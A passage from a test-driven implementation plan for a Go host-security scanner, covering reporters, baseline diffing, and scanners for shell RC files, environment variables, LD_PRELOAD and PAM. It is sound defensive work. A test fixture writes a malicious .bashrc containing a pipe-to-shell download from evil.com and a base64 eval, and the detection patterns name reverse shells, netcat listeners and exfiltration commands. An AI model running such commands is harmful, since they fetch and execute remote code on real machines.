)

var severityColor = map[scanner.Severity]string{
	scanner.SevCritical: "\033[1;31m", // bold red
	scanner.SevHigh:     "\033[0;31m", // red
	scanner.SevMedium:   "\033[0;33m", // yellow
	scanner.SevLow:      "\033[0;36m", // cyan
}

const colorReset = "\033[0m"

type TerminalReporter struct {
	w io.Writer
}

func NewTerminalReporter(w io.Writer) *TerminalReporter {
	return &TerminalReporter{w: w}
}

func (t *TerminalReporter) Render(results []scanner.ScanResult) {
	var allFindings []scanner.Finding
	for _, r := range results {
		allFindings = append(allFindings, r.Findings...)
	}

	// Sort by severity (critical first)
	sort.Slice(allFindings, func(i, j int) bool {
		return allFindings[i].Severity > allFindings[j].Severity
	})

	fmt.Fprintf(t.w, "\n")
	for _, f := range allFindings {
		color := severityColor[f.Severity]
		fmt.Fprintf(t.w, "%s[%s]%s %s\n", color, f.Severity, colorReset, f.Title)
		if f.Location != "" {
			fmt.Fprintf(t.w, "  Location: %s\n", f.Location)
		}
		if f.Detail != "" {
			fmt.Fprintf(t.w, "  Detail: %s\n", f.Detail)
		}
		if f.Evidence != "" {
			fmt.Fprintf(t.w, "  Evidence: %s\n", f.Evidence)
		}
		if f.Remediation != "" {
			fmt.Fprintf(t.w, "  Recommended: %s\n", f.Remediation)
		}
		fmt.Fprintf(t.w, "\n")
	}

	// Summary
	summary := CountBySeverity(allFindings)
	fmt.Fprintf(t.w, "SCAN COMPLETE: %d findings", len(allFindings))
	if len(allFindings) > 0 {
		fmt.Fprintf(t.w, " — %d critical, %d high, %d medium, %d low",
			summary[scanner.SevCritical],
			summary[scanner.SevHigh],
			summary[scanner.SevMedium],
			summary[scanner.SevLow],
		)
	}
	fmt.Fprintf(t.w, "\n")

	// Scanner status
	for _, r := range results {
		if r.Status == scanner.ScanFailed {
			fmt.Fprintf(t.w, "  FAILED: %s — %s\n", r.Scanner, r.Error)
		} else if r.Status == scanner.ScanSkipped {
			fmt.Fprintf(t.w, "  SKIPPED: %s — %s\n", r.Scanner, r.Error)
		}
	}
}

func CountBySeverity(findings []scanner.Finding) map[scanner.Severity]int {
	counts := map[scanner.Severity]int{
		scanner.SevCritical: 0,
		scanner.SevHigh:     0,
		scanner.SevMedium:   0,
		scanner.SevLow:      0,
	}
	for _, f := range findings {
		counts[f.Severity]++
	}
	return counts
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/reporter/ -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
cd /workspace/company/nunenuh/defense-kit
git add defense-kit-cli/internal/reporter/
git commit -m "feat: add terminal reporter with colored severity output"
```

---

### Task 7: JSON Reporter

**Files:**
- Create: `defense-kit-cli/internal/reporter/json.go`
- Modify: `defense-kit-cli/internal/reporter/reporter_test.go`

- [ ] **Step 1: Write failing test**

```go
// Add to internal/reporter/reporter_test.go
func TestJSONReporterWrite(t *testing.T) {
	results := []scanner.ScanResult{
		{
			Scanner:  "ssh",
			Status:   scanner.ScanSuccess,
			Findings: []scanner.Finding{
				{
					ID:       "ssh-abc123",
					Scanner:  "ssh",
					Severity: scanner.SevHigh,
					Title:    "Root login enabled",
					Location: "/etc/ssh/sshd_config",
				},
			},
		},
	}

	dir := t.TempDir()
	jr := NewJSONReporter(dir)
	scanID, err := jr.Write(results, "test-host")
	if err != nil {
		t.Fatal(err)
	}
	if scanID == "" {
		t.Error("scan ID should not be empty")
	}

	// Verify file exists
	path := jr.OutputPath(scanID)
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}

	var report ScanReport
	if err := json.Unmarshal(data, &report); err != nil {
		t.Fatal(err)
	}
	if report.Host != "test-host" {
		t.Errorf("host = %s, want test-host", report.Host)
	}
	if report.Summary.High != 1 {
		t.Errorf("summary.high = %d, want 1", report.Summary.High)
	}
	if len(report.Findings) != 1 {
		t.Errorf("findings count = %d, want 1", len(report.Findings))
	}
}
```

Add imports: `"encoding/json"`, `"os"`

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/reporter/ -v -run TestJSON`
Expected: FAIL

- [ ] **Step 3: Implement json.go**

```go
// internal/reporter/json.go
package reporter

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
)

type ScanReport struct {
	ScanID   string            `json:"scan_id"`
	Host     string            `json:"host"`
	Time     time.Time         `json:"time"`
	Duration string            `json:"duration,omitempty"`
	Summary  SeveritySummary   `json:"summary"`
	Findings []scanner.Finding `json:"findings"`
	Results  []scanner.ScanResult `json:"results"`
}

type SeveritySummary struct {
	Critical int `json:"critical"`
	High     int `json:"high"`
	Medium   int `json:"medium"`
	Low      int `json:"low"`
	Total    int `json:"total"`
}

type JSONReporter struct {
	outputDir string
}

func NewJSONReporter(outputDir string) *JSONReporter {
	return &JSONReporter{outputDir: outputDir}
}

func (j *JSONReporter) Write(results []scanner.ScanResult, host string) (string, error) {
	var allFindings []scanner.Finding
	for _, r := range results {
		allFindings = append(allFindings, r.Findings...)
	}

	counts := CountBySeverity(allFindings)
	now := time.Now()
	scanID := fmt.Sprintf("dk-%s", now.Format("20060102-150405"))

	report := ScanReport{
		ScanID:   scanID,
		Host:     host,
		Time:     now,
		Summary: SeveritySummary{
			Critical: counts[scanner.SevCritical],
			High:     counts[scanner.SevHigh],
			Medium:   counts[scanner.SevMedium],
			Low:      counts[scanner.SevLow],
			Total:    len(allFindings),
		},
		Findings: allFindings,
		Results:  results,
	}

	dir := filepath.Join(j.outputDir, scanID)
	if err := os.MkdirAll(dir, 0750); err != nil {
		return "", err
	}

	data, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		return "", err
	}

	path := filepath.Join(dir, "findings.json")
	if err := os.WriteFile(path, data, 0640); err != nil {
		return "", err
	}

	return scanID, nil
}

func (j *JSONReporter) OutputPath(scanID string) string {
	return filepath.Join(j.outputDir, scanID, "findings.json")
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/reporter/ -v`
Expected: PASS (all tests)

- [ ] **Step 5: Commit**

```bash
cd /workspace/company/nunenuh/defense-kit
git add defense-kit-cli/internal/reporter/json.go defense-kit-cli/internal/reporter/reporter_test.go
git commit -m "feat: add JSON reporter with structured scan report output"
```

---

### Task 8: Baseline System

**Files:**
- Create: `defense-kit-cli/internal/baseline/baseline.go`
- Create: `defense-kit-cli/internal/baseline/baseline_test.go`

- [ ] **Step 1: Write failing test**

```go
// internal/baseline/baseline_test.go
package baseline

import (
	"path/filepath"
	"testing"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
)

func TestSaveAndLoad(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "baseline.json")

	b := Baseline{
		Version:      1,
		Host:         "test-host",
		ScanID:       "dk-20260321-143022",
		Findings: []scanner.Finding{
			{
				ID:       "ssh-abc123",
				Scanner:  "ssh",
				Severity: scanner.SevHigh,
				Title:    "Root login enabled",
			},
		},
		Acknowledged: []string{},
	}

	if err := Save(path, b); err != nil {
		t.Fatal(err)
	}

	loaded, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if loaded.Host != "test-host" {
		t.Errorf("host = %s, want test-host", loaded.Host)
	}
	if len(loaded.Findings) != 1 {
		t.Errorf("findings = %d, want 1", len(loaded.Findings))
	}
}

func TestDiff(t *testing.T) {
	old := Baseline{
		Findings: []scanner.Finding{
			{ID: "ssh-abc123", Severity: scanner.SevHigh, Title: "Root login"},
			{ID: "cron-def456", Severity: scanner.SevMedium, Title: "Suspicious cron"},
		},
	}

	current := []scanner.Finding{
		{ID: "ssh-abc123", Severity: scanner.SevHigh, Title: "Root login"},     // still present
		{ID: "net-ghi789", Severity: scanner.SevCritical, Title: "Reverse shell"}, // new
	}

	d := Diff(old, current)
	if len(d.New) != 1 {
		t.Errorf("new = %d, want 1", len(d.New))
	}
	if d.New[0].ID != "net-ghi789" {
		t.Errorf("new finding = %s, want net-ghi789", d.New[0].ID)
	}
	if len(d.Resolved) != 1 {
		t.Errorf("resolved = %d, want 1", len(d.Resolved))
	}
	if d.Resolved[0].ID != "cron-def456" {
		t.Errorf("resolved finding = %s, want cron-def456", d.Resolved[0].ID)
	}
	if len(d.Unchanged) != 1 {
		t.Errorf("unchanged = %d, want 1", len(d.Unchanged))
	}
}

func TestLoadMissingFileReturnsEmpty(t *testing.T) {
	b, err := Load("/nonexistent/baseline.json")
	if err != nil {
		t.Fatal(err)
	}
	if len(b.Findings) != 0 {
		t.Error("missing file should return empty baseline")
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/baseline/ -v`
Expected: FAIL

- [ ] **Step 3: Implement baseline.go**

```go
// internal/baseline/baseline.go
package baseline

import (
	"encoding/json"
	"os"
	"time"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
)

type Baseline struct {
	Version      int               `json:"version"`
	CreatedAt    time.Time         `json:"created_at"`
	Host         string            `json:"host"`
	ScanID       string            `json:"scan_id"`
	Findings     []scanner.Finding `json:"findings"`
	Acknowledged []string          `json:"acknowledged"`
}

type DiffResult struct {
	New       []scanner.Finding `json:"new"`
	Resolved  []scanner.Finding `json:"resolved"`
	Changed   []FindingChange   `json:"changed"`
	Unchanged []scanner.Finding `json:"unchanged"`
}

type FindingChange struct {
	Finding     scanner.Finding  `json:"finding"`
	OldSeverity scanner.Severity `json:"old_severity"`
}

func Save(path string, b Baseline) error {
	b.Version = 1
	if b.CreatedAt.IsZero() {
		b.CreatedAt = time.Now()
	}
	data, err := json.MarshalIndent(b, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(path, data, 0640)
}

func Load(path string) (Baseline, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return Baseline{Version: 1}, nil
		}
		return Baseline{}, err
	}
	var b Baseline
	if err := json.Unmarshal(data, &b); err != nil {
		return Baseline{}, err
	}
	return b, nil
}

func Diff(old Baseline, current []scanner.Finding) DiffResult {
	oldByID := make(map[string]scanner.Finding)
	for _, f := range old.Findings {
		oldByID[f.ID] = f
	}

	currentByID := make(map[string]scanner.Finding)
	for _, f := range current {
		currentByID[f.ID] = f
	}

	var result DiffResult

	for _, f := range current {
		if oldF, exists := oldByID[f.ID]; exists {
			if oldF.Severity != f.Severity {
				result.Changed = append(result.Changed, FindingChange{
					Finding:     f,
					OldSeverity: oldF.Severity,
				})
			} else {
				result.Unchanged = append(result.Unchanged, f)
			}
		} else {
			result.New = append(result.New, f)
		}
	}

	for _, f := range old.Findings {
		if _, exists := currentByID[f.ID]; !exists {
			result.Resolved = append(result.Resolved, f)
		}
	}

	return result
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/baseline/ -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
cd /workspace/company/nunenuh/defense-kit
git add defense-kit-cli/internal/baseline/
git commit -m "feat: add baseline save/load/diff system"
```

---

### Task 9: First Scanner Group — Environment (shell_rc, env_vars, ld_preload, pam)

**Files:**
- Create: `defense-kit-cli/internal/scanner/environment/shellrc.go`
- Create: `defense-kit-cli/internal/scanner/environment/envvars.go`
- Create: `defense-kit-cli/internal/scanner/environment/ldpreload.go`
- Create: `defense-kit-cli/internal/scanner/environment/pam.go`
- Create: `defense-kit-cli/internal/scanner/environment/environment_test.go`

This is the first real scanner implementation. It demonstrates the pattern all other scanners follow. Starting with environment because these are the most relevant to the AWS key leak incident (shell RC poisoning, env var hijacking).

- [ ] **Step 1: Write failing test for ShellRC scanner**

```go
// internal/scanner/environment/environment_test.go
package environment

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
)

func TestShellRCScanner_DetectsSuspiciousEntries(t *testing.T) {
	dir := t.TempDir()
	// Create a .bashrc with suspicious content
	bashrc := filepath.Join(dir, ".bashrc")
	content := `# normal stuff
alias ll='ls -la'
# malicious
curl http://evil.com/payload | bash
eval $(base64 -d <<< "bWFsaWNpb3Vz")
export PATH="/tmp/evil:$PATH"
`
	if err := os.WriteFile(bashrc, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	s := NewShellRCScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) == 0 {
		t.Fatal("should detect suspicious entries in .bashrc")
	}

	// Verify findings have proper structure
	for _, f := range findings {
		if f.Scanner != "shell_rc" {
			t.Errorf("scanner = %s, want shell_rc", f.Scanner)
		}
		if f.ID == "" {
			t.Error("finding should have an ID")
		}
		if f.Severity < scanner.SevMedium {
			t.Error("suspicious RC entries should be at least MEDIUM severity")
		}
	}
}

func TestShellRCScanner_CleanFileNoFindings(t *testing.T) {
	dir := t.TempDir()
	bashrc := filepath.Join(dir, ".bashrc")
	content := `# clean bashrc
alias ll='ls -la'
export EDITOR=vim
`
	if err := os.WriteFile(bashrc, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	s := NewShellRCScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Errorf("clean bashrc should produce 0 findings, got %d", len(findings))
	}
}

func TestShellRCScanner_Interface(t *testing.T) {
	s := NewShellRCScanner()
	if s.Name() != "shell_rc" {
		t.Errorf("name = %s, want shell_rc", s.Name())
	}
	if s.Category() != "environment" {
		t.Errorf("category = %s, want environment", s.Category())
	}
	if s.RequiresRoot() {
		t.Error("shell_rc scanner should not require root")
	}
	if !s.Available() {
		t.Error("shell_rc scanner should always be available")
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/scanner/environment/ -v`
Expected: FAIL

- [ ] **Step 3: Implement shellrc.go**

```go
// internal/scanner/environment/shellrc.go
package environment

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
)

var suspiciousPatterns = []struct {
	pattern  *regexp.Regexp
	severity scanner.Severity
	title    string
	detail   string
}{
	{
		pattern:  regexp.MustCompile(`curl\s+.*\|\s*(ba)?sh`),
		severity: scanner.SevCritical,
		title:    "Pipe-to-shell pattern detected in RC file",
		detail:   "Downloads and executes remote code. Common malware persistence technique.",
	},
	{
		pattern:  regexp.MustCompile(`wget\s+.*\|\s*(ba)?sh`),
		severity: scanner.SevCritical,
		title:    "Pipe-to-shell pattern detected in RC file",
		detail:   "Downloads and executes remote code. Common malware persistence technique.",
	},
	{
		pattern:  regexp.MustCompile(`eval\s+.*base64`),
		severity: scanner.SevCritical,
		title:    "Base64-encoded eval in RC file",
		detail:   "Obfuscated code execution. Likely malicious.",
	},
	{
		pattern:  regexp.MustCompile(`eval\s+\$\(`),
		severity: scanner.SevHigh,
		title:    "Dynamic eval in RC file",
		detail:   "Evaluates dynamically generated code. Review for legitimacy.",
	},
	{
		pattern:  regexp.MustCompile(`export\s+PATH=.*/tmp/`),
		severity: scanner.SevHigh,
		title:    "PATH includes /tmp directory",
		detail:   "/tmp in PATH allows execution of planted binaries.",
	},
	{
		pattern:  regexp.MustCompile(`nc\s+-[a-z]*l`),
		severity: scanner.SevCritical,
		title:    "Netcat listener in RC file",
		detail:   "Opens a network listener on login. Backdoor indicator.",
	},
	{
		pattern:  regexp.MustCompile(`/dev/tcp/`),
		severity: scanner.SevCritical,
		title:    "Bash /dev/tcp reverse shell in RC file",
		detail:   "Opens outbound TCP connection on login. Reverse shell indicator.",
	},
	{
		pattern:  regexp.MustCompile(`PROMPT_COMMAND=.*curl`),
		severity: scanner.SevCritical,
		title:    "PROMPT_COMMAND with network call",
		detail:   "Executes network request on every command. Data exfiltration indicator.",
	},
	{
		pattern:  regexp.MustCompile(`PROMPT_COMMAND=.*wget`),
		severity: scanner.SevCritical,
		title:    "PROMPT_COMMAND with network call",
		detail:   "Executes network request on every command. Data exfiltration indicator.",
	},
}

var rcFiles = []string{
	".bashrc", ".bash_profile", ".bash_login", ".bash_logout",
	".profile", ".zshrc", ".zprofile", ".zlogin", ".zlogout",
}

type ShellRCScanner struct{}

func NewShellRCScanner() *ShellRCScanner {
	return &ShellRCScanner{}
}

func (s *ShellRCScanner) Name() string        { return "shell_rc" }
func (s *ShellRCScanner) Category() string    { return "environment" }
func (s *ShellRCScanner) Description() string { return "Detect malicious entries in shell RC files (.bashrc, .profile, .zshrc)" }
func (s *ShellRCScanner) RequiredTools() []string { return nil }
func (s *ShellRCScanner) OptionalTools() []string { return nil }
func (s *ShellRCScanner) RequiresRoot() bool      { return false }
func (s *ShellRCScanner) Available() bool          { return true }

func (s *ShellRCScanner) Scan(ctx context.Context, opts scanner.ScanOptions) ([]scanner.Finding, error) {
	var findings []scanner.Finding

	paths := opts.TargetPaths
	if len(paths) == 0 {
		home, err := os.UserHomeDir()
		if err != nil {
			return nil, err
		}
		paths = []string{home}
	}

	for _, dir := range paths {
		for _, rcFile := range rcFiles {
			select {
			case <-ctx.Done():
				return findings, ctx.Err()
			default:
			}

			path := filepath.Join(dir, rcFile)
			fileFindings, err := s.scanFile(path)
			if err != nil {
				continue // file doesn't exist or can't read, skip
			}
			findings = append(findings, fileFindings...)
		}

		// Also scan /etc/profile.d/ if scanning root
		etcProfileD := filepath.Join(dir, "etc", "profile.d")
		if dir == "/" {
			etcProfileD = "/etc/profile.d"
		}
		if entries, err := os.ReadDir(etcProfileD); err == nil {
			for _, entry := range entries {
				if entry.IsDir() {
					continue
				}
				path := filepath.Join(etcProfileD, entry.Name())
				fileFindings, err := s.scanFile(path)
				if err != nil {
					continue
				}
				findings = append(findings, fileFindings...)
			}
		}
	}

	return findings, nil
}

func (s *ShellRCScanner) scanFile(path string) ([]scanner.Finding, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var findings []scanner.Finding
	lineNum := 0
	sc := bufio.NewScanner(file)

	for sc.Scan() {
		lineNum++
		line := sc.Text()
		trimmed := strings.TrimSpace(line)

		// Skip comments and empty lines
		if trimmed == "" || strings.HasPrefix(trimmed, "#") {
			continue
		}

		for _, sp := range suspiciousPatterns {
			if sp.pattern.MatchString(line) {
				location := fmt.Sprintf("%s:%d", path, lineNum)
				findings = append(findings, scanner.Finding{
					ID:          scanner.GenerateFindingID("shell_rc", location, sp.title),
					Scanner:     "shell_rc",
					Severity:    sp.severity,
					Title:       sp.title,
					Detail:      sp.detail,
					Evidence:    trimmed,
					Location:    location,
					Remediation: fmt.Sprintf("Review and remove suspicious line from %s", path),
					CanAutoFix:  false,
				})
			}
		}
	}

	return findings, sc.Err()
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/scanner/environment/ -v`
Expected: PASS

- [ ] **Step 5: Implement envvars.go (env var poisoning scanner)**

```go
// internal/scanner/environment/envvars.go
package environment

import (
	"context"
	"fmt"
	"os"
	"strings"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
)

type EnvVarsScanner struct{}

func NewEnvVarsScanner() *EnvVarsScanner { return &EnvVarsScanner{} }

func (s *EnvVarsScanner) Name() string        { return "env_vars" }
func (s *EnvVarsScanner) Category() string    { return "environment" }
func (s *EnvVarsScanner) Description() string { return "Detect environment variable poisoning (PATH, LD_*, PROMPT_COMMAND)" }
func (s *EnvVarsScanner) RequiredTools() []string { return nil }
func (s *EnvVarsScanner) OptionalTools() []string { return nil }
func (s *EnvVarsScanner) RequiresRoot() bool      { return false }
func (s *EnvVarsScanner) Available() bool          { return true }

func (s *EnvVarsScanner) Scan(ctx context.Context, opts scanner.ScanOptions) ([]scanner.Finding, error) {
	var findings []scanner.Finding

	// Check PATH for suspicious entries
	pathVal := os.Getenv("PATH")
	for _, dir := range strings.Split(pathVal, ":") {
		if strings.Contains(dir, "/tmp") || strings.Contains(dir, "/dev/shm") {
			findings = append(findings, scanner.Finding{
				ID:          scanner.GenerateFindingID("env_vars", "PATH", "Suspicious PATH entry: "+dir),
				Scanner:     "env_vars",
				Severity:    scanner.SevHigh,
				Title:       "Suspicious directory in PATH",
				Detail:      fmt.Sprintf("PATH contains writable directory: %s", dir),
				Evidence:    fmt.Sprintf("PATH=%s", pathVal),
				Location:    "environment:PATH",
				Remediation: fmt.Sprintf("Remove %s from PATH", dir),
			})
		}
		if dir == "." || dir == "" {
			findings = append(findings, scanner.Finding{
				ID:          scanner.GenerateFindingID("env_vars", "PATH", "Current directory in PATH"),
				Scanner:     "env_vars",
				Severity:    scanner.SevHigh,
				Title:       "Current directory (.) in PATH",
				Detail:      "Allows execution of malicious binaries from any working directory",
				Evidence:    fmt.Sprintf("PATH=%s", pathVal),
				Location:    "environment:PATH",
				Remediation: "Remove '.' and empty entries from PATH",
			})
		}
	}

	// Check LD_PRELOAD
	if val := os.Getenv("LD_PRELOAD"); val != "" {
		findings = append(findings, scanner.Finding{
			ID:          scanner.GenerateFindingID("env_vars", "LD_PRELOAD", val),
			Scanner:     "env_vars",
			Severity:    scanner.SevCritical,
			Title:       "LD_PRELOAD is set",
			Detail:      "LD_PRELOAD forces libraries to load before all others. Common rootkit technique.",
			Evidence:    fmt.Sprintf("LD_PRELOAD=%s", val),
			Location:    "environment:LD_PRELOAD",
			Remediation: "Investigate the preloaded library and unset LD_PRELOAD if unauthorized",
		})
	}

	// Check LD_LIBRARY_PATH
	if val := os.Getenv("LD_LIBRARY_PATH"); val != "" {
		for _, dir := range strings.Split(val, ":") {
			if strings.Contains(dir, "/tmp") || strings.Contains(dir, "/dev/shm") || strings.HasPrefix(dir, "/home") {
				findings = append(findings, scanner.Finding{
					ID:          scanner.GenerateFindingID("env_vars", "LD_LIBRARY_PATH", dir),
					Scanner:     "env_vars",
					Severity:    scanner.SevHigh,
					Title:       "Suspicious LD_LIBRARY_PATH entry",
					Detail:      fmt.Sprintf("LD_LIBRARY_PATH contains user-writable directory: %s", dir),
					Evidence:    fmt.Sprintf("LD_LIBRARY_PATH=%s", val),
					Location:    "environment:LD_LIBRARY_PATH",
					Remediation: fmt.Sprintf("Remove %s from LD_LIBRARY_PATH", dir),
				})
			}
		}
	}

	// Check PROMPT_COMMAND
	if val := os.Getenv("PROMPT_COMMAND"); val != "" {
		suspicious := []string{"curl", "wget", "nc ", "ncat", "/dev/tcp", "base64"}
		for _, s := range suspicious {
			if strings.Contains(val, s) {
				findings = append(findings, scanner.Finding{
					ID:          scanner.GenerateFindingID("env_vars", "PROMPT_COMMAND", val),
					Scanner:     "env_vars",
					Severity:    scanner.SevCritical,
					Title:       "Suspicious PROMPT_COMMAND",
					Detail:      "PROMPT_COMMAND runs on every prompt render. Contains network/encoding commands.",
					Evidence:    fmt.Sprintf("PROMPT_COMMAND=%s", val),
					Location:    "environment:PROMPT_COMMAND",
					Remediation: "Review and unset PROMPT_COMMAND",
				})
				break
			}
		}
	}

	// Check http_proxy/https_proxy for hijacking
	for _, envVar := range []string{"http_proxy", "https_proxy", "HTTP_PROXY", "HTTPS_PROXY"} {
		if val := os.Getenv(envVar); val != "" {
			if !strings.Contains(val, "127.0.0.1") && !strings.Contains(val, "localhost") {
				findings = append(findings, scanner.Finding{
					ID:          scanner.GenerateFindingID("env_vars", envVar, val),
					Scanner:     "env_vars",
					Severity:    scanner.SevMedium,
					Title:       fmt.Sprintf("Proxy variable %s is set", envVar),
					Detail:      "Traffic may be routed through an external proxy. Verify this is intentional.",
					Evidence:    fmt.Sprintf("%s=%s", envVar, val),
					Location:    fmt.Sprintf("environment:%s", envVar),
					Remediation: fmt.Sprintf("Verify %s points to a trusted proxy", envVar),
				})
			}
		}
	}

	return findings, nil
}
```

- [ ] **Step 6: Implement ldpreload.go**

```go
// internal/scanner/environment/ldpreload.go
package environment

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"strings"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
)

type LDPreloadScanner struct{}

func NewLDPreloadScanner() *LDPreloadScanner { return &LDPreloadScanner{} }

func (s *LDPreloadScanner) Name() string        { return "ld_preload" }
func (s *LDPreloadScanner) Category() string    { return "environment" }
func (s *LDPreloadScanner) Description() string { return "Detect LD_PRELOAD hijacking and rogue shared libraries" }
func (s *LDPreloadScanner) RequiredTools() []string { return nil }
func (s *LDPreloadScanner) OptionalTools() []string { return nil }
func (s *LDPreloadScanner) RequiresRoot() bool      { return true }
func (s *LDPreloadScanner) Available() bool          { return true }

func (s *LDPreloadScanner) Scan(ctx context.Context, opts scanner.ScanOptions) ([]scanner.Finding, error) {
	var findings []scanner.Finding

	// Check /etc/ld.so.preload
	if f, err := os.Open("/etc/ld.so.preload"); err == nil {
		defer f.Close()
		sc := bufio.NewScanner(f)
		lineNum := 0
		for sc.Scan() {
			lineNum++
			line := strings.TrimSpace(sc.Text())
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			// Any entry in ld.so.preload is suspicious unless it's a known legitimate library
			findings = append(findings, scanner.Finding{
				ID:          scanner.GenerateFindingID("ld_preload", "/etc/ld.so.preload", line),
				Scanner:     "ld_preload",
				Severity:    scanner.SevCritical,
				Title:       "Library in /etc/ld.so.preload",
				Detail:      "This library is loaded into every process. Common rootkit persistence technique.",
				Evidence:    line,
				Location:    fmt.Sprintf("/etc/ld.so.preload:%d", lineNum),
				Remediation: fmt.Sprintf("Investigate %s — remove if unauthorized", line),
			})
		}
	}

	// Check /etc/ld.so.conf.d/ for unusual entries
	if entries, err := os.ReadDir("/etc/ld.so.conf.d"); err == nil {
		for _, entry := range entries {
			select {
			case <-ctx.Done():
				return findings, ctx.Err()
			default:
			}
			path := fmt.Sprintf("/etc/ld.so.conf.d/%s", entry.Name())
			f, err := os.Open(path)
			if err != nil {
				continue
			}
			sc := bufio.NewScanner(f)
			for sc.Scan() {
				line := strings.TrimSpace(sc.Text())
				if line == "" || strings.HasPrefix(line, "#") {
					continue
				}
				if strings.Contains(line, "/tmp") || strings.Contains(line, "/dev/shm") || strings.HasPrefix(line, "/home") {
					findings = append(findings, scanner.Finding{
						ID:          scanner.GenerateFindingID("ld_preload", path, line),
						Scanner:     "ld_preload",
						Severity:    scanner.SevHigh,
						Title:       "Suspicious library path in ld.so.conf.d",
						Detail:      fmt.Sprintf("Library search path includes writable directory: %s", line),
						Evidence:    line,
						Location:    path,
						Remediation: fmt.Sprintf("Remove suspicious entry from %s", path),
					})
				}
			}
			f.Close()
		}
	}

	return findings, nil
}
```

- [ ] **Step 7: Implement pam.go**

```go
// internal/scanner/environment/pam.go
package environment

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
)

type PAMScanner struct{}

func NewPAMScanner() *PAMScanner { return &PAMScanner{} }

func (s *PAMScanner) Name() string        { return "pam" }
func (s *PAMScanner) Category() string    { return "environment" }
func (s *PAMScanner) Description() string { return "Detect modified PAM configs and unauthorized PAM modules" }
func (s *PAMScanner) RequiredTools() []string { return nil }
func (s *PAMScanner) OptionalTools() []string { return nil }
func (s *PAMScanner) RequiresRoot() bool      { return true }
func (s *PAMScanner) Available() bool          { return true }

var suspiciousPAMModules = []string{
	"pam_exec.so",      // Executes arbitrary commands during auth
	"pam_script.so",    // Runs scripts during auth
	"pam_permit.so",    // Always permits access (bypass)
}

func (s *PAMScanner) Scan(ctx context.Context, opts scanner.ScanOptions) ([]scanner.Finding, error) {
	var findings []scanner.Finding

	pamDir := "/etc/pam.d"
	entries, err := os.ReadDir(pamDir)
	if err != nil {
		return nil, nil // PAM not available, skip
	}

	for _, entry := range entries {
		select {
		case <-ctx.Done():
			return findings, ctx.Err()
		default:
		}

		if entry.IsDir() {
			continue
		}

		path := filepath.Join(pamDir, entry.Name())
		f, err := os.Open(path)
		if err != nil {
			continue
		}

		lineNum := 0
		sc := bufio.NewScanner(f)
		for sc.Scan() {
			lineNum++
			line := strings.TrimSpace(sc.Text())
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}

			for _, mod := range suspiciousPAMModules {
				if strings.Contains(line, mod) {
					severity := scanner.SevHigh
					if mod == "pam_permit.so" && strings.Contains(line, "auth") {
						severity = scanner.SevCritical
					}
					location := fmt.Sprintf("%s:%d", path, lineNum)
					findings = append(findings, scanner.Finding{
						ID:          scanner.GenerateFindingID("pam", location, mod),
						Scanner:     "pam",
						Severity:    severity,
						Title:       fmt.Sprintf("Suspicious PAM module: %s", mod),
						Detail:      fmt.Sprintf("PAM config %s uses %s which can bypass authentication", entry.Name(), mod),
						Evidence:    line,
						Location:    location,
						Remediation: fmt.Sprintf("Review PAM config %s — remove %s if unauthorized", path, mod),
					})
				}
			}
		}
		f.Close()
	}

	return findings, nil
}
```

- [ ] **Step 8: Add tests for envvars, ldpreload, pam scanners**

Add to `environment_test.go`:

```go
func TestEnvVarsScanner_Interface(t *testing.T) {
	s := NewEnvVarsScanner()
	if s.Name() != "env_vars" { t.Errorf("name = %s", s.Name()) }
	if s.Category() != "environment" { t.Errorf("category = %s", s.Category()) }
}

func TestLDPreloadScanner_Interface(t *testing.T) {
	s := NewLDPreloadScanner()
	if s.Name() != "ld_preload" { t.Errorf("name = %s", s.Name()) }
	if s.RequiresRoot() != true { t.Error("should require root") }
}

func TestPAMScanner_Interface(t *testing.T) {
	s := NewPAMScanner()
